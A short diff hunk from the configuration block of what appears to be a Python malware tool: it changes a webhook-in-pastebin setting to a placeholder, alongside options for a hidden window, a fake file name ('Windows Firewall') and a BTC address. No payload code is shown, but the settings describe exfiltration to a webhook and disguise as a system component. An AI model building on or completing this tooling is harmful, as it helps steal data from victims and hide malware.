@@ -45,7 +45,7 @@ from win32com.client import GetObject
 # Configuration
 debugger = False
 BTC_ADDRESS = ''
-pastebin = "" #Put here your webhook in a raw pastebin, like this one "https://pastebin.com/raw/mHCfzzS5"
+pastebin = "paste_link_here" #Put here your webhook in a raw pastebin, like this one "https://pastebin.com/raw/mHCfzzS5"
 hiddenWindow = True
 FakeFileName = "Windows Firewall"
 fakeError = False 
